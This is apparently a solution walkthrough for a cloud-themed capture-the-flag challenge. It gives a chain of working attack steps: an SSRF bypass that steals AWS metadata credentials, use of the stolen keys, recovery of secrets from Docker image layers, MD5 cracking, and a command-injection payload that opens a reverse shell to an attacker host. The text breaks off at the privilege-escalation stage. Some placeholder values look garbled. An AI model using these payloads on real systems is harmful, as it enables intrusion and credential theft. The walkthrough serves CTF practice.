# Cloud Chain CTF (Insane) - Solution Walkthrough

## Challenge Overview
**Points**: 500
**Entry Point**: `http://<EC2_1_IP>/`

## Tools Setup
*   **Burp Suite**: For web exploitation.
*   **Hashcat/John**: For password cracking.
*   **AWS CLI**: For enumeration.
*   **Docker**: For forensics.

## Stage 1: SSRF Bypass (App 1)
1.  **Vulnerability**: `/check?url=...` allows SSRF but blocks `169.254`.
2.  **Bypass**: Use Decimal IP `dass`.
3.  **Action**: `curl "http://<IP>/check?url=http://2852039166/latest/meta-data/iam/security-credentials/CTF_SSRF_Role"`
4.  **Result**: Get AWS AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN.

## Stage 2: AWS Enumeration & Docker Forensics
1.  **AWS CLI**: Configure with stolen keys.
2.  **Find Resources**: `aws ec2 describe-instances` (gets User Flag in tags), `aws ecr list-images`.
3.  **Docker Forensics**:
    *   `aws ecr get-login-password ... | docker login ...`
    *   `docker pull <IMAGE_URI>`
    *   Check history: `docker history <IMAGE_URI>` -> Sees deleted secrets layer.
    *   Extract layer: `docker save ... | tar -xf ...` -> Find [secrets.yaml](file:///home/z33/Templates/ctf-play/ctf_challenge/secret_image/secrets.yaml).

## Stage 3: Password Cracking
1.  **Find Hash**: [secrets.yaml](file:///home/z33/Templates/ctf-play/ctf_challenge/secret_image/secrets.yaml) contains `password_hash: 0192023a7bbd73250516f069df18b500`.
2.  **Identify**: It's a raw MD5 hash (32 hex chars).
3.  **Crack**:
    ```bash
    echo "0192023a7bbd73250516f069df18b500" > hash.txt
    john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ```

## Stage 4: RCE (App 2)
1.  **Login**: Use `admin` / `dasas` on the internal web app.
2.  **Exploit**: Input `127.0.0.1%0a/bin/bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/<ATTACKER_IP>/4444${IFS}0>&1'` into the Ping Tool.
3.  **Result**: Reverse Shell as `www-data`.

## Stage 5: Privilege Escalation (Tar Wildcard)
1.  **Enumeration**: `sudo -l` -> `/usr/local/bin/backup-log.sh` (runs tar *).
